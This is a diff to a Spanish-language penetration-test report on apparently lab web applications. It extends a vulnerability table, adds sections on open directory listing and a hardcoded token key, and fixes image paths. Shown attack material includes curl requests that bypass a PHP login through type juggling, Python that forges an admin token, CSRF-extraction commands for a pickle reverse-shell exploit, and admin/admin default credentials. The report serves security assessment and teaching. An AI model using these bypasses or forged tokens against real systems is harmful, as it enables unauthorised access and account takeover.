@@ -42,17 +42,22 @@ Para cada vulnerabilidad identificada, hemos documentado no solo su explotación
 | Debug mode activado | App1 | Alto | DEBUG=True expone información sensible del sistema |
 | Configuración insegura de cookies | App1, App3 | Medio | Falta HttpOnly, Secure y SameSite correctamente configurados |
 | Session timeout inadecuado | App1, App2, App3 | Medio | Sesiones con caducidad excesiva o permanente |
-| Contraseñas débiles | App1 | Alto | Credenciales predeterminadas (admin/admin) |
+| Contraseñas débiles | App1, App2 | Alto | Credenciales predeterminadas (admin/admin) |
 | Acceso al panel de administración | App1 | Alto | Panel admin accesible sin restricciones adicionales |
 | Upload sin validación | App1 | Crítico | Permite subir cualquier tipo de archivo (malware upload) |
+| Error EOFError en Gallery View | App1 | Bajo | Error no manejado al navegar entre secciones |
 | RCE via Python Pickle | App1 | Crítico | Deserialización insegura permite ejecución remota de código |
 | Credenciales en texto plano (BD) | App1, App2, App3 | Crítico | Contraseñas sin cifrar en base de datos |
+| Directory listing y acceso no autorizado | App1, App2, App3 | Alto | Archivos de usuarios accesibles sin autenticación |
+| Cifrado con clave embebida en el cliente | App1 | Crítico | Clave de cifrado visible en código fuente |
+| Compromiso total de la aplicación | App1, App2 | Crítico | Acceso total vía credenciales débiles |
 | Exposición de esquema SQL | App2 | Alto | Archivo database.sql accesible públicamente |
 | PHP Type Juggling | App2 | Alto | Comparación débil permite bypass de autenticación |
 | Local File Inclusion (LFI) | App2 | Alto | Permite acceso a archivos del sistema |
 | SQL Injection | App2, App3 | Crítico | Consultas SQL sin parametrizar |
 | Ausencia de cookies de sesión | App2 | Medio | Sin mecanismos alternativos seguros implementados |
 | Falta de cabeceras de seguridad | App2 | Medio | X-Content-Type-Options y X-Frame-Options ausentes |
+| Vulnerabilidad token (uso del Bearer) | App2 | Grave | Token JWT con privilegios excesivos |
 | SSTI (Server-Side Template Injection) | App3 | Crítico | Inyección de plantillas permite RCE |
 | Session Fixation | App3 | Medio | Cookies con valores predeterminados |
 | CSRF habilitado | App3 | Medio | CSRF_ENABLED=True en configuración |
@@ -60,6 +65,8 @@ Para cada vulnerabilidad identificada, hemos documentado no solo su explotación
 | Buffer Overflow + Format String | Puerto 5555 (App5) | Alto | Vulnerabilidad en binario C |
 | Permisos sudo mal configurados | Sistema | Crítico | Usuario con privilegios totales (ALL:ALL) |
 | Permisos SQL excesivos | Sistema | Crítico | Usuario puede ejecutar comandos del sistema vía MySQL |
+| Ausencia de antivirus | Sistema | Medio | Sin protección contra malware |
+| Sesión anónima FTP | Sistema | Medio | Acceso FTP sin verificación (teórico) |
 
 ---
 
@@ -76,6 +83,10 @@ nmap 192.168.88.128
 **Resultados Obtenidos:**
 
 ![Nmap a UBUNTU](photos/NMAP.png)
+
+**Escaneo UDP:**
+
+![Escaneo UDP](photos/Pasted%20image%2020251203110814.png)
 
 ### Análisis Detallado por Puerto
 
@@ -172,7 +183,7 @@ nmap 192.168.88.128
 nmap -sU 192.168.88.128
 ```
 
-![Escaneo UDP](photos/Pasted image 20251203110814.png)
+![Escaneo UDP](photos/Pasted%20image%2020251203110814.png)
 
 Se detectó un puerto filtrado en el 5353.
 
@@ -217,7 +228,7 @@ Al acceder a `http://192.168.207.130:9001/` observamos inmediatamente que el ser
 - `backup_app2.tar.gz`
 - `backup_app3.tar.gz`
 
-![Listado de directorios en puerto 9001](photos/Pasted image 20251204200546.png)
+![Listado de directorios en puerto 9001](photos/Pasted%20image%2020251204200546.png)
 
 #### Impacto
 
@@ -338,7 +349,7 @@ Durante el análisis del panel de administración accesible en `http://app1.unie
 - **Usuario:** admin
 - **Contraseña:** admin
 
-![Fuerza bruta exitosa](photos/Pasted image 20251204201834.png)
+![Fuerza bruta exitosa](photos/Pasted%20image%2020251204201834.png)
 
 #### Impacto
 
@@ -403,7 +414,7 @@ Al intentar acceder a la sección de perfil desde Gallery View, la aplicación g
 
 En el archivo `/var/www/html/app1/users/views.py`, línea 84, dentro de la clase `ProfileView`, encontramos el uso inseguro de `pickle.loads()` para deserializar datos del usuario sin validación previa.
 
-![Código vulnerable con pickle](photos/Pasted image 20251203102909.png)
+![Código vulnerable con pickle](photos/Pasted%20image%2020251203102909.png)
 
 #### Explotación Paso a Paso
 
@@ -435,7 +446,7 @@ LINEA=$(grep -n "action=\"/users/profile/\"" home_autenticado.html | cut -d: -f1
 PROFILE_CSRF=$(cat home_autenticado.html | tr '>' '\n' | grep "csrfmiddlewaretoken" | sed 's/.*value="//' | sed 's/".*//')
 ```
 
-![Extracción de CSRF](photos/Pasted image 20251204163818.png)
+![Extracción de CSRF](photos/Pasted%20image%2020251204163818.png)
 
 **4. Configurar listener:**
 
@@ -466,7 +477,7 @@ curl -b cookies.txt -X POST \
   http://app1.unie/users/profile/ -s > /dev/null
 ```
 
-![Reverse shell exitosa](photos/Pasted image 20251204164328.png)
+![Reverse shell exitosa](photos/Pasted%20image%2020251204164328.png)
 
 #### Impacto
 
@@ -519,6 +530,64 @@ La aplicación no implementa HTTPS, operando completamente sobre HTTP. Esto sign
 - Ataques Man-in-the-Middle
 - Posibilidad de modificar el tráfico en tránsito
 - No hay verificación de la legitimidad del servidor
+
+### 11. Directory Listing y Acceso No Autorizado
+
+#### Descripción
+
+La ruta `http://app1.unie/static/` presenta un listado de directorios completamente abierto. Sin necesidad de autenticación, cualquier usuario puede visualizar y descargar archivos subidos por diferentes usuarios de la aplicación.
+
+#### Explotación
+
+Simplemente navegando a `http://app1.unie/static/` se puede ver toda la estructura de carpetas y archivos, incluyendo:
+- Imágenes subidas por usuarios
+- Documentos personales
+- Archivos de configuración
+- Cualquier contenido almacenado en el directorio
+
+#### Impacto
+
+- **Fuga masiva de información:** Acceso a datos de múltiples usuarios sin control
+- **Violación de privacidad:** Los usuarios no son conscientes de que sus archivos son públicos
+- **Incumplimiento normativo:** Posible violación de GDPR y otras regulaciones de protección de datos
+- **Confianza del usuario:** Pérdida total de confianza en la seguridad de la plataforma
+- **Exfiltración de datos sensibles:** Documentos corporativos, información personal identificable (PII), etc.
+
+### 12. Cifrado con Clave Embebida en el Cliente
+
+#### Descripción
+
+Durante el análisis del tráfico con BurpSuite, identificamos que los tokens de sesión están aparentemente cifrados. Sin embargo, al revisar el código fuente disponible en los backups, descubrimos que la clave de cifrado utilizada para proteger estos tokens se encuentra hardcodeada directamente en el código de la aplicación.
+
+#### Análisis Técnico
+
+El código muestra algo similar a:
+
+```python
+ENCRYPTION_KEY = "mi_clave_secreta_123456"
+
+def encrypt_token(data):
+    # Cifrado usando la clave hardcodeada
+    return cipher.encrypt(data, ENCRYPTION_KEY)
+```
+
+#### Impacto
+
+Esta vulnerabilidad es extremadamente grave porque:
+
+1. **Reversibilidad total:** Con acceso a la clave, cualquier token cifrado puede ser descifrado trivialmente
+2. **Generación de tokens falsos:** Un atacante puede crear tokens de sesión válidos para cualquier usuario
+3. **Suplantación de identidad:** Acceso completo a cualquier cuenta sin conocer credenciales
+4. **Modificación de tokens:** Alteración de datos de sesión como roles o permisos
+5. **Sin rotación posible:** Cambiar la clave requiere modificar el código y redistribuir la aplicación
+
+**Escenario de ataque:**
+```python
+# Atacante con acceso al código
+ENCRYPTION_KEY = "mi_clave_secreta_123456"  # Extraída del código
+admin_token = encrypt_token({"user_id": 1, "role": "admin"}, ENCRYPTION_KEY)
+# Ahora tiene un token de administrador válido
+```
 
 ---
 
@@ -574,7 +643,7 @@ Conocer el esquema exacto permite:
 
 Revisando el código en `var/www/html/app2/UserService.php`, identificamos que el sistema utiliza comparación débil (`==`) en lugar de comparación estricta (`===`) para validar credenciales.
 
-![Código vulnerable en UserService.php](photos/Pasted image 20251203100647.png)
+![Código vulnerable en UserService.php](photos/Pasted%20image%2020251203100647.png)
 
 #### Explotación
 
@@ -586,7 +655,7 @@ curl -X POST http://app2.unie/v2/users/login \
   -d '{"email":"admin@app2.unie","password":"correctPassword"}'
 ```
 
-![Respuesta con credenciales correctas](photos/Pasted image 20251203100938.png)
+![Respuesta con credenciales correctas](photos/Pasted%20image%2020251203100938.png)
 
 **Bypass mediante Type Juggling:**
 
@@ -596,7 +665,7 @@ curl -X POST http://app2.unie/v2/users/login \
   -d '{"email":"admin@app2.unie","password":true}'
 ```
 
-![Bypass exitoso](photos/Pasted image 20251203101135.png)
+![Bypass exitoso](photos/Pasted%20image%2020251203101135.png)
 
 Enviando `true` como contraseña, PHP convierte ambos valores a booleanos durante la comparación débil, resultando en una validación exitosa sin conocer la contraseña real.
 
